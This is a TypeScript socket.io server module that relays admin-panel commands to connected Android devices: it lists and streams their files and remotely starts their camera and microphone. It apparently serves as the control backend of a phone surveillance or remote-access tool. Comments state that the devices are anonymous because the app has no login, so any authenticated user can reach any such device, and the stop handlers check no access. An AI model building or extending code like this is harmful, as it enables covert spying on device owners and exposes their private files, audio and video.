import { Socket, Server } from 'socket.io';
import Device from '../../models/Device';
import logger from '../../utils/logger';
import FileAccess from '../../models/FileAccess';

/**
 * DeviceFileBridgeHandler - Bridges file requests from admin panel to devices
 * 
 * When admin panel requests files from a device:
 * 1. Admin panel sends request via WebSocket to backend
 * 2. Backend forwards request to device socket
 * 3. Device responds with file data
 * 4. Backend forwards response back to admin panel
 * 
 * This only works while device socket is connected.
 */
// Shared request tracker across all instances
export const pendingRequests: Map<string, {
  adminSocketId: string;
  deviceId: string;
  requestType: string;
  timestamp: number;
  timeout?: NodeJS.Timeout;
}> = new Map();

// Request timeout in milliseconds (30 seconds)
const REQUEST_TIMEOUT = 30000;

export class DeviceFileBridgeHandler {
  private socket: Socket;
  private io: Server;
  private static cleanupInterval: NodeJS.Timeout | null = null;

  constructor(socket: Socket, io: Server) {
    this.socket = socket;
    this.io = io;
    this.setupEventHandlers();
    this.startCleanupInterval();
  }

  private startCleanupInterval(): void {
    // Only start cleanup interval once
    if (DeviceFileBridgeHandler.cleanupInterval) {
      return;
    }

    // Clean up stale requests every 5 minutes
    DeviceFileBridgeHandler.cleanupInterval = setInterval(() => {
      const now = Date.now();
      const staleThreshold = 5 * 60 * 1000; // 5 minutes

      for (const [requestId, request] of pendingRequests.entries()) {
        if (now - request.timestamp > staleThreshold) {
          logger.warn(`[DeviceFileBridge] Cleaning up stale request - requestId: ${requestId}, age: ${now - request.timestamp}ms`);
          if (request.timeout) {
            clearTimeout(request.timeout);
          }
          pendingRequests.delete(requestId);
        }
      }
    }, 5 * 60 * 1000); // Run every 5 minutes
  }

  private setupEventHandlers(): void {
    // Handle file list requests from admin panel
    this.socket.on('device:file:list:request', async (data: {
      deviceId: string;
      path: string;
      requestId: string;
    }) => {
      await this.handleFileListRequest(data);
    });

    // Handle file stream requests from admin panel
    this.socket.on('device:file:stream:request', async (data: {
      deviceId: string;
      path: string;
      requestId: string;
    }) => {
      await this.handleFileStreamRequest(data);
    });

    // Handle file metadata requests from admin panel
    this.socket.on('device:file:metadata:request', async (data: {
      deviceId: string;
      path: string;
      requestId: string;
    }) => {
      await this.handleFileMetadataRequest(data);
    });

    // Handle media stream requests from admin panel
    this.socket.on('device:camera:stream:start', async (data: {
      deviceId: string;
    }) => {
      await this.handleCameraStreamStart(data);
    });

    this.socket.on('device:camera:stream:stop', async (data: {
      deviceId: string;
    }) => {
      await this.handleCameraStreamStop(data);
    });

    this.socket.on('device:microphone:stream:start', async (data: {
      deviceId: string;
    }) => {
      await this.handleMicrophoneStreamStart(data);
    });

    this.socket.on('device:microphone:stream:stop', async (data: {
      deviceId: string;
    }) => {
      await this.handleMicrophoneStreamStop(data);
    });

    // Forward responses from devices to admin panel
    this.forwardDeviceResponses();
  }

  private async handleFileListRequest(data: {
    deviceId: string;
    path: string;
    requestId: string;
  }): Promise<void> {
    try {
      const { deviceId, path, requestId } = data;
      const userId = this.socket.data.userId;

      logger.info(`[DeviceFileBridge] File list request - deviceId: ${deviceId}, path: ${path}, requestId: ${requestId}, userId: ${userId || 'N/A'}, role: ${this.socket.data.role || 'N/A'}`);

      // Verify device access
      logger.info(`[DeviceFileBridge] Looking up device with ID: ${deviceId}`);
      const device = await Device.findById(deviceId);
      if (!device) {
        logger.warn(`[DeviceFileBridge] Device not found: ${deviceId}`);
        this.socket.emit('device:file:list:response', {
          requestId,
          success: false,
          error: 'Device not found',
        });
        return;
      }

      logger.info(`[DeviceFileBridge] Device found - deviceId: ${device.deviceId}, deviceName: ${device.deviceName}, isOnline: ${device.isOnline}, userId: ${device.userId || 'anonymous'}`);

      // Verify user has access to device
      // Admin users can access all devices
      // Regular users can access:
      //   - Devices that belong to them (device.userId matches userId)
      //   - Anonymous devices (devices without userId) - since app has no login
      if (this.socket.data.role !== 'admin') {
        // If device has a userId, check if it matches the user's userId
        if (device.userId) {
          if (!userId || device.userId.toString() !== userId) {
            this.socket.emit('device:file:list:response', {
              requestId,
              success: false,
              error: 'Access denied',
            });
            if (userId) {
              await this.logFileAccess(userId, deviceId, path, 'list', false);
            }
            return;
          }
        }
        // If device has no userId (anonymous device), allow access to authenticated users
        // This is the normal case since the Android app has no login screen
      }

      // Find device socket
      logger.info(`[DeviceFileBridge] Looking for device socket - deviceId: ${device.deviceId}`);
      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (!deviceSocket) {
        logger.warn(`[DeviceFileBridge] Device socket not found - deviceId: ${device.deviceId}, device isOnline: ${device.isOnline}`);
        this.socket.emit('device:file:list:response', {
          requestId,
          success: false,
          error: 'Device is not connected',
        });
        return;
      }

      logger.info(`[DeviceFileBridge] Device socket found - socketId: ${deviceSocket.id}, deviceId: ${device.deviceId}`);

      // Normalize path - handle empty path (device expects "/" for root)
      let normalizedPath = path;
      if (!normalizedPath || normalizedPath.trim() === '') {
        normalizedPath = '/';
        logger.info(`[DeviceFileBridge] Path is empty, normalizing to root: ${normalizedPath}`);
      }

      // Set up timeout for request
      const timeout = setTimeout(() => {
        logger.warn(`[DeviceFileBridge] Request timeout - requestId: ${requestId}, deviceId: ${device.deviceId}, path: ${normalizedPath}`);
        const pendingRequest = pendingRequests.get(requestId);
        if (pendingRequest) {
          const adminSocket = this.io.sockets.sockets.get(pendingRequest.adminSocketId);
          if (adminSocket) {
            adminSocket.emit('device:file:list:response', {
              requestId,
              success: false,
              error: 'Request timeout - device did not respond within 30 seconds',
            });
            logger.warn(`[DeviceFileBridge] Sent timeout response to admin socket - requestId: ${requestId}`);
          }
          pendingRequests.delete(requestId);
        }
      }, REQUEST_TIMEOUT);

      // Store request for response forwarding with timeout
      pendingRequests.set(requestId, {
        adminSocketId: this.socket.id,
        deviceId: device.deviceId,
        requestType: 'list',
        timestamp: Date.now(),
        timeout,
      });

      logger.info(`[DeviceFileBridge] Stored pending request - requestId: ${requestId}, adminSocketId: ${this.socket.id}, timeout: ${REQUEST_TIMEOUT}ms`);

      // Forward request to device
      const requestData = {
        path: normalizedPath,
        requestId,
      };
      logger.info(`[DeviceFileBridge] Forwarding request to device - socketId: ${deviceSocket.id}, path: ${normalizedPath}, requestId: ${requestId}`);
      logger.info(`[DeviceFileBridge] Request data being sent: ${JSON.stringify(requestData)}`);
      
      // Emit to device - Socket.io will wrap the object in an array
      logger.info(`[DeviceFileBridge] Emitting file:list:request to device socket: ${deviceSocket.id}`);
      deviceSocket.emit('file:list:request', requestData);
      
      logger.info(`[DeviceFileBridge] File list request emitted to device socket: ${deviceSocket.id}`);
      logger.info(`[DeviceFileBridge] Waiting for response from device - requestId: ${requestId}, timeout: ${REQUEST_TIMEOUT}ms`);
      
      // Also log all listeners on the device socket to debug
      logger.info(`[DeviceFileBridge] Device socket listeners count: ${deviceSocket.listeners('file:list:request').length}`);
    } catch (error: any) {
      logger.error('Error handling file list request:', error);
      this.socket.emit('device:file:list:response', {
        requestId: data.requestId,
        success: false,
        error: error.message || 'Request failed',
      });
    }
  }

  private async handleFileStreamRequest(data: {
    deviceId: string;
    path: string;
    requestId: string;
  }): Promise<void> {
    try {
      const { deviceId, path, requestId } = data;
      const userId = this.socket.data.userId;

      // Verify device access
      const device = await Device.findById(deviceId);
      if (!device) {
        this.socket.emit('device:file:stream:error', {
          requestId,
          error: 'Device not found',
        });
        return;
      }

      // Verify user has access to device
      // Admin users can access all devices
      // Regular users can access:
      //   - Devices that belong to them (device.userId matches userId)
      //   - Anonymous devices (devices without userId) - since app has no login
      if (this.socket.data.role !== 'admin') {
        // If device has a userId, check if it matches the user's userId
        if (device.userId) {
          if (!userId || device.userId.toString() !== userId) {
            this.socket.emit('device:file:stream:error', {
              requestId,
              error: 'Access denied',
            });
            if (userId) {
              await this.logFileAccess(userId, deviceId, path, 'view', false);
            }
            return;
          }
        }
        // If device has no userId (anonymous device), allow access to authenticated users
        // This is the normal case since the Android app has no login screen
      }

      // Find device socket
      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (!deviceSocket) {
        this.socket.emit('device:file:stream:error', {
          requestId,
          error: 'Device is not connected',
        });
        return;
      }

      // Store request for response forwarding
      pendingRequests.set(requestId, {
        adminSocketId: this.socket.id,
        deviceId: device.deviceId,
        requestType: 'stream',
        timestamp: Date.now(),
      });

      // Forward request to device
      deviceSocket.emit('file:stream:request', {
        path,
        requestId,
      });

      logger.info(`File stream request forwarded to device: ${device.deviceId}, path: ${path}`);
    } catch (error: any) {
      logger.error('Error handling file stream request:', error);
      this.socket.emit('device:file:stream:error', {
        requestId: data.requestId,
        error: error.message || 'Request failed',
      });
    }
  }

  private async handleFileMetadataRequest(data: {
    deviceId: string;
    path: string;
    requestId: string;
  }): Promise<void> {
    try {
      const { deviceId, path, requestId } = data;
      const userId = this.socket.data.userId;

      // Verify device access
      const device = await Device.findById(deviceId);
      if (!device) {
        this.socket.emit('device:file:metadata:response', {
          requestId,
          success: false,
          error: 'Device not found',
        });
        return;
      }

      // Verify user has access to device
      // Admin users can access all devices
      // Regular users can access:
      //   - Devices that belong to them (device.userId matches userId)
      //   - Anonymous devices (devices without userId) - since app has no login
      if (this.socket.data.role !== 'admin') {
        // If device has a userId, check if it matches the user's userId
        if (device.userId) {
          if (!userId || device.userId.toString() !== userId) {
            this.socket.emit('device:file:metadata:response', {
              requestId,
              success: false,
              error: 'Access denied',
            });
            return;
          }
        }
        // If device has no userId (anonymous device), allow access to authenticated users
        // This is the normal case since the Android app has no login screen
      }

      // Find device socket
      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (!deviceSocket) {
        this.socket.emit('device:file:metadata:response', {
          requestId,
          success: false,
          error: 'Device is not connected',
        });
        return;
      }

      // Store request for response forwarding
      pendingRequests.set(requestId, {
        adminSocketId: this.socket.id,
        deviceId: device.deviceId,
        requestType: 'metadata',
        timestamp: Date.now(),
      });

      // Forward request to device
      deviceSocket.emit('file:metadata:request', {
        path,
        requestId,
      });

      logger.info(`File metadata request forwarded to device: ${device.deviceId}, path: ${path}`);
    } catch (error: any) {
      logger.error('Error handling file metadata request:', error);
      this.socket.emit('device:file:metadata:response', {
        requestId: data.requestId,
        success: false,
        error: error.message || 'Request failed',
      });
    }
  }

  private forwardDeviceResponses(): void {
    // This method is kept for compatibility but responses are handled in socket.io.ts
    // Device responses are forwarded directly from device sockets
  }

  private async findDeviceSocket(deviceId: string): Promise<Socket | null> {
    try {
      logger.info(`[DeviceFileBridge] Searching for device socket - deviceId: ${deviceId}`);
      const sockets = await this.io.fetchSockets();
      logger.info(`[DeviceFileBridge] Total sockets found: ${sockets.length}`);
      
      // Log all device sockets for debugging
      const deviceSockets = sockets.filter(s => s.data.isDevice);
      logger.info(`[DeviceFileBridge] Device sockets found: ${deviceSockets.length}`);
      deviceSockets.forEach(s => {
        logger.info(`[DeviceFileBridge] Device socket - id: ${s.id}, deviceId: ${s.data.deviceId || 'N/A'}, device.deviceId: ${s.data.device?.deviceId || 'N/A'}`);
      });

      const deviceSocket = sockets.find(
        (socket) => socket.data.deviceId === deviceId || 
                   (socket.data.device && socket.data.device.deviceId === deviceId)
      );
      
      if (!deviceSocket) {
        logger.warn(`[DeviceFileBridge] Device socket not found - deviceId: ${deviceId}`);
        return null;
      }

      logger.info(`[DeviceFileBridge] Found matching device socket - socketId: ${deviceSocket.id}, deviceId: ${deviceId}`);

      // Get the actual socket from the server
      const actualSocket = this.io.sockets.sockets.get(deviceSocket.id);
      if (!actualSocket) {
        logger.warn(`[DeviceFileBridge] Actual socket not found in server map - socketId: ${deviceSocket.id}`);
        return null;
      }

      logger.info(`[DeviceFileBridge] Retrieved actual socket - socketId: ${actualSocket.id}`);
      return actualSocket;
    } catch (error) {
      logger.error(`[DeviceFileBridge] Error finding device socket - deviceId: ${deviceId}:`, error);
      return null;
    }
  }

  private async logFileAccess(
    userId: string,
    deviceId: string,
    filePath: string,
    action: string,
    success: boolean
  ): Promise<void> {
    try {
      // Only log if filePath is provided
      if (!filePath || filePath.trim() === '') {
        return;
      }

      await FileAccess.create({
        userId,
        deviceId,
        filePath: filePath.trim(),
        action: action as 'view' | 'download' | 'upload' | 'delete',
        success,
        ipAddress: this.socket.handshake.address,
        userAgent: this.socket.handshake.headers['user-agent'],
      });
    } catch (error) {
      logger.error('Failed to log file access:', error);
    }
  }

  private async handleCameraStreamStart(data: { deviceId: string }): Promise<void> {
    try {
      const { deviceId } = data;
      const userId = this.socket.data.userId;

      // Verify device access
      const device = await Device.findById(deviceId);
      if (!device) {
        this.socket.emit('device:camera:stream:error', {
          error: 'Device not found',
        });
        return;
      }

      // Verify user has access (same logic as file access)
      if (this.socket.data.role !== 'admin') {
        if (device.userId) {
          if (!userId || device.userId.toString() !== userId) {
            this.socket.emit('device:camera:stream:error', {
              error: 'Access denied',
            });
            return;
          }
        }
      }

      // Find device socket
      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (!deviceSocket) {
        this.socket.emit('device:camera:stream:error', {
          error: 'Device is not connected',
        });
        return;
      }

      // Forward request to device
      deviceSocket.emit('camera:stream:start');
      logger.info(`[DeviceFileBridge] Camera stream start forwarded to device: ${device.deviceId}`);
    } catch (error: any) {
      logger.error('Error handling camera stream start:', error);
      this.socket.emit('device:camera:stream:error', {
        error: error.message || 'Request failed',
      });
    }
  }

  private async handleCameraStreamStop(data: { deviceId: string }): Promise<void> {
    try {
      const { deviceId } = data;
      const device = await Device.findById(deviceId);
      if (!device) {
        return;
      }

      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (deviceSocket) {
        deviceSocket.emit('camera:stream:stop');
        logger.info(`[DeviceFileBridge] Camera stream stop forwarded to device: ${device.deviceId}`);
      }
    } catch (error: any) {
      logger.error('Error handling camera stream stop:', error);
    }
  }

  private async handleMicrophoneStreamStart(data: { deviceId: string }): Promise<void> {
    try {
      const { deviceId } = data;
      const userId = this.socket.data.userId;

      // Verify device access
      const device = await Device.findById(deviceId);
      if (!device) {
        this.socket.emit('device:microphone:stream:error', {
          error: 'Device not found',
        });
        return;
      }

      // Verify user has access
      if (this.socket.data.role !== 'admin') {
        if (device.userId) {
          if (!userId || device.userId.toString() !== userId) {
            this.socket.emit('device:microphone:stream:error', {
              error: 'Access denied',
            });
            return;
          }
        }
      }

      // Find device socket
      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (!deviceSocket) {
        this.socket.emit('device:microphone:stream:error', {
          error: 'Device is not connected',
        });
        return;
      }

      // Forward request to device
      deviceSocket.emit('microphone:stream:start');
      logger.info(`[DeviceFileBridge] Microphone stream start forwarded to device: ${device.deviceId}`);
    } catch (error: any) {
      logger.error('Error handling microphone stream start:', error);
      this.socket.emit('device:microphone:stream:error', {
        error: error.message || 'Request failed',
      });
    }
  }

  private async handleMicrophoneStreamStop(data: { deviceId: string }): Promise<void> {
    try {
      const { deviceId } = data;
      const device = await Device.findById(deviceId);
      if (!device) {
        return;
      }

      const deviceSocket = await this.findDeviceSocket(device.deviceId);
      if (deviceSocket) {
        deviceSocket.emit('microphone:stream:stop');
        logger.info(`[DeviceFileBridge] Microphone stream stop forwarded to device: ${device.deviceId}`);
      }
    } catch (error: any) {
      logger.error('Error handling microphone stream stop:', error);
    }
  }
}

